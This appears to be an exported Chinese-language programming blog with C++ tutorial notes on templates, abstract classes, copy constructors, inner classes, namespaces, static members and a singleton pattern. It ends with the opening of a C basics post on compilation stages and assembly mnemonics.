<p>当程序同为冒泡排序，只是数组的数据类型不同时，可以使用模板替换其中的一部分。</p>
<p>模板可以替换各种类型。如果类型时自己定义的，比如定义一个Number类，要给Number类中的成员进行冒泡排序，则需要先运算符重载，使<code>&gt;</code>可以比较Number中成员的大小。</p>
<p>案例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">template &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BubbleSort</span><span class="params">(T arr[], <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; length - i - <span class="number">1</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                T temp = arr[j];</span><br><span class="line">                arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Number</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">private:</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">    Number(<span class="type">int</span> x)</span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;x = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> operator&gt;(Number&amp; num)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> this-&gt;x &gt; num.x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr1[] = &#123; <span class="number">5</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">9</span> &#125;;</span><br><span class="line">    BubbleSort&lt;<span class="type">int</span>&gt;(arr1, <span class="keyword">sizeof</span>(arr1) / <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    Number arr2[] = &#123; Number(<span class="number">5</span>), Number(<span class="number">1</span>), Number(<span class="number">3</span>), Number(<span class="number">2</span>), Number(<span class="number">4</span>), Number(<span class="number">8</span>), Number(<span class="number">9</span>), Number(<span class="number">12</span>), Number(<span class="number">7</span>), Number(<span class="number">8</span>), Number(<span class="number">5</span>), Number(<span class="number">10</span>), Number(<span class="number">6</span>), Number(<span class="number">2</span>), Number(<span class="number">9</span>) &#125;;</span><br><span class="line">    BubbleSort&lt;Number&gt;(arr2, <span class="keyword">sizeof</span>(arr2) / <span class="keyword">sizeof</span>(Number));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="纯虚函数"><a href="#纯虚函数" class="headerlink" title="纯虚函数"></a>纯虚函数</h2><h3 id="什么是纯虚函数"><a href="#什么是纯虚函数" class="headerlink" title="什么是纯虚函数"></a>什么是纯虚函数</h3><p>&lt; 1 &gt; 将成员函数声明为virtual</p>
<p>&lt; 2 &gt;该函数没有函数体（后跟&#x3D;0）</p>
<p>如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CBank</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">	virtual <span class="title function_">double</span><span class="params">(返回值)</span> <span class="title function_">GetAnnualRate</span><span class="params">(函数名)</span><span class="params">()</span><span class="params">(参数列表)</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><p>&lt; 1 &gt;含有纯虚函数的类，称为抽象类（Abstract Class）</p>
<p>&lt; 2 &gt;抽象类也可以包含普通成员函数</p>
<p>&lt; 3 &gt;抽象类不能实例化</p>
<p>如使用以下方式定义一个对象：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CBank bank;						<span class="comment">//全局区	栈</span></span><br><span class="line">CBank* pBank = new CBank;		<span class="comment">//堆</span></span><br></pre></td></tr></table></figure>

<p>此时编译器会报错<code>cannot instantiate abstract class due to folowing members(无法实例化一个抽象类)</code></p>
<p>纯虚函数导致了抽象类的存在，抽象类则可以定义规范、定义一些规则<br>比如以下案例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 银行年利率</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CBank</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">	virtual <span class="type">double</span> <span class="title function_">GetAnnualRate</span><span class="params">()</span> = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中国工商银行</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ICBCBank</span> :</span>public CBank</span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">	<span class="type">double</span> m_dPrincipal;</span><br><span class="line">public:</span><br><span class="line">	ICBCBank(<span class="type">double</span> dPrincipal)</span><br><span class="line">	&#123;</span><br><span class="line">		m_dPrincipal = dPrincipal;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">double</span> <span class="title function_">GetAnnualRate</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0.010</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">double</span> <span class="title function_">GetTotalMoney</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> m_dPrincipal + m_dPrincipal * GetAnnualRate();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中国建设银行</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCBank</span> :</span>public CBank</span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">	<span class="type">double</span> m_dPrincipal;</span><br><span class="line">public:</span><br><span class="line">	CCBank(<span class="type">double</span> dPrincipal)</span><br><span class="line">	&#123;</span><br><span class="line">		m_dPrincipal = dPrincipal;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">double</span> <span class="title function_">GetAnnualRate</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0.015</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">double</span> <span class="title function_">GetTotalMoney</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> m_dPrincipal + m_dPrincipal * GetAnnualRate();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ShowAnnualRate</span><span class="params">(CBank* pBank[], DWORD nLength)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nLength; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%.5lf \n&quot;</span>, pBank[i]-&gt;GetAnnualRate());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	ICBCBank <span class="title function_">icbc</span><span class="params">(<span class="number">10000.0</span>)</span>;</span><br><span class="line">	<span class="type">double</span> dMoney1 = icbc.GetTotalMoney();</span><br><span class="line">	CCBank <span class="title function_">ccb</span><span class="params">(<span class="number">10000.0</span>)</span>;</span><br><span class="line">	<span class="type">double</span> dMoney2 = ccb.GetTotalMoney();</span><br><span class="line"></span><br><span class="line">	CBank* pBank[] = &#123; &amp;icbc,&amp;ccb &#125;;</span><br><span class="line">	ShowAnnualRate(pBank, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个案例中，银行都继承了CBank这个抽象类，这个抽象类中的纯虚函数定义了子类应该如何获取年利率，因此子类需要重写这个函数。</p>
<p>而它存在的意义就是，当我们需要获取所有的银行的年利率时，有一个这样统一的规范可以将所有银行的年利率统一起来，使用<code>void ShowAnnualRate(CBank* pBank[], DWORD nLength)</code>来让父类指向子类。</p>
<p>这都是站在使用的角度来说。</p>
<h2 id="对象拷贝-拷贝构造函数"><a href="#对象拷贝-拷贝构造函数" class="headerlink" title="对象拷贝-拷贝构造函数"></a>对象拷贝-拷贝构造函数</h2><h3 id="拷贝构造函数"><a href="#拷贝构造函数" class="headerlink" title="拷贝构造函数"></a>拷贝构造函数</h3><img src="/2024/02/28/c-1/image-20240229083940206.png" alt="image-20240229083940206" style="zoom: 67%;">

<p>拷贝构造函数时，如果子类有继承的父类对象，父类也会被继承过来</p>
<img src="/2024/02/28/c-1/image-20240229085147294.png" alt="image-20240229085147294" style="zoom:67%;">

<h3 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">private:</span><br><span class="line">	<span class="type">int</span> m_nLength;</span><br><span class="line">	<span class="type">char</span>* m_strBuffer;</span><br><span class="line">public:</span><br><span class="line">	Object() &#123;&#125;</span><br><span class="line">	Object(<span class="type">const</span> <span class="type">char</span>* str)</span><br><span class="line">	&#123;</span><br><span class="line">		m_nLength = <span class="built_in">strlen</span>(str) + <span class="number">1</span>;</span><br><span class="line">		m_strBuffer = new <span class="type">char</span>[m_nLength];</span><br><span class="line">		<span class="built_in">memset</span>(m_strBuffer, <span class="number">0</span>, m_nLength);</span><br><span class="line">		<span class="built_in">strcpy</span>(m_strBuffer, str);</span><br><span class="line">	&#125; </span><br><span class="line">	~Object()</span><br><span class="line">	&#123;</span><br><span class="line">		delete[] m_strBuffer;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	Object <span class="title function_">Obj</span><span class="params">(<span class="string">&quot;Hello World&quot;</span>)</span>;</span><br><span class="line">	Object <span class="title function_">newObj</span><span class="params">(Obj)</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>像这样拷贝一个对象，在类中传递了一个指针，当拷贝这个指针时，不会拷贝指针指向地址中存储的数据，而是会拷贝这个指针。</p>
<p>所以当原对象空间被释放时，会把后来拷贝的对象的空间一块释放掉，导致程序错误</p>
<p>这个程序拷贝完之后，发现拷贝后类中的字符串指向的地址是相同的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">newObj	&#123;m_nLength=12 m_strBuffer=0x00c8a640 &quot;Hello World&quot; &#125;	Object</span><br><span class="line"></span><br><span class="line">Obj	&#123;m_nLength=12 m_strBuffer=0x00c8a640 &quot;Hello World&quot; &#125;	Object</span><br></pre></td></tr></table></figure>

<p>这两个字符串指向的是同一个地址<code>0x00c8a640</code>，当第一个对象地址释放时，拷贝的对象中的字符串也会被释放。</p>
<h3 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h3><p>基于上面这种情况，要自己写一个拷贝构造函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">private:</span><br><span class="line">	<span class="type">int</span> m_nLength;</span><br><span class="line">	<span class="type">char</span>* m_strBuffer;</span><br><span class="line">public:</span><br><span class="line">	Object() &#123;&#125;</span><br><span class="line">	Object(<span class="type">const</span> <span class="type">char</span>* str)</span><br><span class="line">	&#123;</span><br><span class="line">		m_nLength = <span class="built_in">strlen</span>(str) + <span class="number">1</span>;</span><br><span class="line">		m_strBuffer = new <span class="type">char</span>[m_nLength];</span><br><span class="line">		<span class="built_in">memset</span>(m_strBuffer, <span class="number">0</span>, m_nLength);</span><br><span class="line">		<span class="built_in">strcpy</span>(m_strBuffer, str);</span><br><span class="line">	&#125;</span><br><span class="line">	Object(<span class="type">const</span> Object&amp; obj)		<span class="comment">//这里是拷贝构造函数，传入的参数必须是和类相同的对象类型。参数必须是Object&amp;</span></span><br><span class="line">	&#123;</span><br><span class="line">		m_nLength = obj.m_nLength;</span><br><span class="line">		m_strBuffer = new <span class="type">char</span>[m_nLength];	<span class="comment">//开辟了一块新的空间存储拷贝的值</span></span><br><span class="line">		<span class="built_in">memset</span>(m_strBuffer, <span class="number">0</span>, m_nLength);</span><br><span class="line">		<span class="built_in">strcpy</span>(m_strBuffer, obj.m_strBuffer);</span><br><span class="line">	&#125;</span><br><span class="line">	~Object()</span><br><span class="line">	&#123;</span><br><span class="line">		delete[] m_strBuffer;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	Object <span class="title function_">Obj</span><span class="params">(<span class="string">&quot;Hello World&quot;</span>)</span>;</span><br><span class="line">	Object <span class="title function_">newObj</span><span class="params">(Obj)</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时候再看拷贝后的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Obj	&#123;m_nLength=12 m_strBuffer=0x013ca640 &quot;Hello World&quot; &#125;	Object</span><br><span class="line">newObj	&#123;m_nLength=12 m_strBuffer=0x013ca678 &quot;Hello World&quot; &#125;	Object</span><br></pre></td></tr></table></figure>

<p>一个是<code>0x013ca640</code>，一个是<code>0x013ca678</code>，这样当第一个释放空间的时候，第二个拷贝的对象不受影响。</p>
<h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">private:</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">InnerClassPrivate</span></span></span><br><span class="line"><span class="class">	&#123;</span></span><br><span class="line">	private:</span><br><span class="line">		<span class="type">int</span> x;</span><br><span class="line">		<span class="type">int</span> y;</span><br><span class="line">	public:</span><br><span class="line">		InnerClassPrivate()&#123;&#125;</span><br><span class="line">		InnerClassPrivate(<span class="type">int</span> x, <span class="type">int</span> y)</span><br><span class="line">		&#123;</span><br><span class="line">			this-&gt;x = x;</span><br><span class="line">			this-&gt;y = y;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">	OutClass() &#123;&#125;</span><br><span class="line">	OutClass(<span class="type">int</span> a, <span class="type">int</span> b)</span><br><span class="line">	&#123;</span><br><span class="line">		this-&gt;a = a;</span><br><span class="line">		this-&gt;b = b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">void</span> <span class="title function_">Fn</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		InnerClassPrivate <span class="title function_">In</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>)</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	OutClass <span class="title function_">Out</span><span class="params">(<span class="number">5</span>, <span class="number">6</span>)</span>;</span><br><span class="line">	OutClass::InnerClassPrivate(<span class="number">7</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>内部类就是定义在一个类内部的类，可以将内部类定义在外部类的public中，从外部使用<code>OutClass::InnerCLass();</code>可以进行访问。</p>
<p>如果内部类只在这个外部类中使用，则可以定义在这个类的private中，让外部无法访问或者也可以提供使用函数。内部类也可以定义在函数中，比如定义在OutClass的Fn()中。</p>
<p>内部类不会占用外部类的空间。外部类有<code>int a; int b;</code>，其中内部类中有<code>int x</code>，则外部类的大小仍然是8字节。</p>
<h2 id="namespace命名空间"><a href="#namespace命名空间" class="headerlink" title="namespace命名空间"></a>namespace命名空间</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">namespace ns1 &#123;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> <span class="title function_">Fn</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> x + <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">NameSpace</span></span></span><br><span class="line"><span class="class">	&#123;</span></span><br><span class="line">	private:</span><br><span class="line">		<span class="type">int</span> i;</span><br><span class="line">		<span class="type">int</span> j;</span><br><span class="line">		NameSpace() &#123;&#125;</span><br><span class="line">		NameSpace(<span class="type">int</span> i, <span class="type">int</span> j)</span><br><span class="line">		&#123;</span><br><span class="line">			this-&gt;i = i;</span><br><span class="line">			this-&gt;j = j;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace ns2 &#123;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> <span class="title function_">Fn</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> x + <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">NameSpace</span></span></span><br><span class="line"><span class="class">	&#123;</span></span><br><span class="line">	private:</span><br><span class="line">		<span class="type">int</span> i;</span><br><span class="line">		<span class="type">int</span> j;</span><br><span class="line">		NameSpace() &#123;&#125;</span><br><span class="line">		NameSpace(<span class="type">int</span> i, <span class="type">int</span> j)</span><br><span class="line">		&#123;</span><br><span class="line">			this-&gt;i = i;</span><br><span class="line">			this-&gt;j = j;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	ns1::a = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ns2::Fn(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>命名空间中的变量、函数、类等的名称可以相同，当调用时，用<code>namespace::成员名</code>来使用。</p>
<p>如果是创建了一个类文件，在头文件中声明后，可以用using namespace 命名空间来让整个程序直接使用指定命名空间中的成员。</p>
<h2 id="static关键字"><a href="#static关键字" class="headerlink" title="static关键字"></a>static关键字</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>static关键字修饰的变量相当于一个私有的全局变量</p>
<p>比如有这样的一个类：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">`<span class="class"><span class="keyword">class</span> <span class="title">staClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">private:</span><br><span class="line">public :</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line">	<span class="type">int</span> c;</span><br><span class="line">	staClass() &#123;&#125;</span><br><span class="line">	staClass(<span class="type">int</span> b, <span class="type">int</span> c)</span><br><span class="line">	&#123;</span><br><span class="line">		this-&gt;b = b;</span><br><span class="line">		this-&gt;c = c;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中变量a用static修饰，所以在staClass这个类中，a是一个属于staClass私有的全局变量，可以直接进行访问，但是不能从外部访问。</p>
<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public :</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> z;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line">	Demo() &#123;&#125;</span><br><span class="line">	Demo(<span class="type">int</span> a, <span class="type">int</span> b)</span><br><span class="line">	&#123;</span><br><span class="line">		this-&gt;a = a;</span><br><span class="line">		this-&gt;b = b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> <span class="title function_">SetZ</span><span class="params">(<span class="type">int</span> z)</span></span><br><span class="line">	&#123;</span><br><span class="line">		this-&gt;z = z;</span><br><span class="line">		<span class="keyword">return</span> z;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> <span class="title function_">GetZ</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> z;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Demo::z;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	Demo <span class="title function_">d1</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>)</span>;</span><br><span class="line">	Demo <span class="title function_">d2</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>)</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> temp = d1.SetZ(<span class="number">5</span>);</span><br><span class="line">	<span class="type">int</span> temp2 = d2.GetZ();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码中，int z用static修饰，所以z属于这个类中的全局变量，当使用d1对象访问和使用d2对象访问时，访问的是同一个z的地址。</p>
<h3 id="static单子模式"><a href="#static单子模式" class="headerlink" title="static单子模式"></a>static单子模式</h3><p>当要限制创建一个对象时，可以使用static函数进行限制。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">private:</span><br><span class="line">	One() &#123;&#125;		<span class="comment">//1.首先要将无参构造函数私有，使从外部不能直接创建对象</span></span><br><span class="line">	<span class="type">static</span> One* SetUpPoint;		<span class="comment">//3.创建一个静态成员，类型是One指针类型</span></span><br><span class="line">public:</span><br><span class="line">	<span class="type">static</span> One* <span class="title function_">Setup</span><span class="params">()</span>		<span class="comment">//2.提供一个静态函数，因为static修饰的函数从外部可以被访问</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (SetUpPoint == <span class="literal">NULL</span>)		<span class="comment">//5.当这个指针是空指针时，就创建一个对象</span></span><br><span class="line">			SetUpPoint = new One();</span><br><span class="line">		<span class="keyword">return</span> SetUpPoint;			<span class="comment">//6.将创建的这个指针返回</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">One* One::SetUpPoint = <span class="literal">NULL</span>;		<span class="comment">//4.初始化静态成员为空指针</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	One* p1 = One::Setup();</span><br><span class="line">	One* p2 = One::Setup();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="面向对象设计中的static之静态成员函数："><a href="#面向对象设计中的static之静态成员函数：" class="headerlink" title="面向对象设计中的static之静态成员函数："></a>面向对象设计中的static之静态成员函数：</h3><p><strong>总结：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;1&gt;出现在类体外的函数定义不能指定关键字static；</span><br><span class="line">&lt;2&gt;静态成员之间可以相互访问，包括静态成员函数访问静态数据成员和访问静态成员函数；</span><br><span class="line">&lt;3&gt;非静态成员函数可以任意地访问静态成员函数和静态数据成员；</span><br><span class="line">&lt;4&gt;静态成员函数不能访问非静态成员函数和非静态数据成员；</span><br><span class="line">&lt;5&gt;调用类的静态成员函数的两种方式；</span><br><span class="line">		&lt;类名&gt;::&lt;静态成员函数名&gt;（&lt;参数表&gt;）</span><br><span class="line">		&lt;对象名&gt;.&lt;静态成员函数名&gt;(&lt;参数表&gt;)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>Cpp</tag>
      </tags>
  </entry>
  <entry>
    <title>c</title>
    <url>/2023/12/15/c/</url>
    <content><![CDATA[<h1 id="C"><a href="#C" class="headerlink" title="C"></a>C</h1><h2 id="C基础"><a href="#C基础" class="headerlink" title="C基础"></a>C基础</h2><h3 id="一、c语言分步编译"><a href="#一、c语言分步编译" class="headerlink" title="一、c语言分步编译"></a>一、c语言分步编译</h3><p>1.预处理：宏定义展开 头文件展开 条件编译 去注释</p>
<p>2.汇编 检查语法 将C语言转变成汇编语言</p>
<p>3.汇编 将汇编语言转成机器语言</p>
<p>4.链接 将C语言依赖库链接到程序中</p>
<p><img src="/2023/12/15/c/image-20231204140915723.png" alt="image-20231204140915723"></p>
<span id="more"></span>

<img src="/2023/12/15/c/image-20231204141249224.png" alt="image-20231204141249224" style="zoom: 67%;">

<h4 id="一步编译"><a href="#一步编译" class="headerlink" title="一步编译"></a>一步编译</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">gcc -o hello.exe hello1.c hello2.c</span><br></pre></td></tr></table></figure>

<h4 id="常见代码异常"><a href="#常见代码异常" class="headerlink" title="常见代码异常"></a>常见代码异常</h4><p>1.编辑时异常</p>
<p>2.编译时异常</p>
<p>3.运行时异常</p>
<h4 id="程序执行过程"><a href="#程序执行过程" class="headerlink" title="程序执行过程"></a>程序执行过程</h4><p><img src="/2023/12/15/c/image-20231204142152340.png" alt="image-20231204142152340"></p>
<h3 id="二、汇编语言和程序调试"><a href="#二、汇编语言和程序调试" class="headerlink" title="二、汇编语言和程序调试"></a>二、汇编语言和程序调试</h3><img src="/2023/12/15/c/image-20231204145742260.png" alt="image-20231204145742260" style="zoom:50%;">

<p><img src="/2023/12/15/c/image-20231204145845807.png" alt="image-20231204145845807"></p>
<blockquote>
<h4 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h4><p>mov 移动<br>add 添加<br>push 压栈<br>pop 出栈<br>call 调用<br>eax 32位寄存器<br>简单的加法计算</p>
</blockquote>
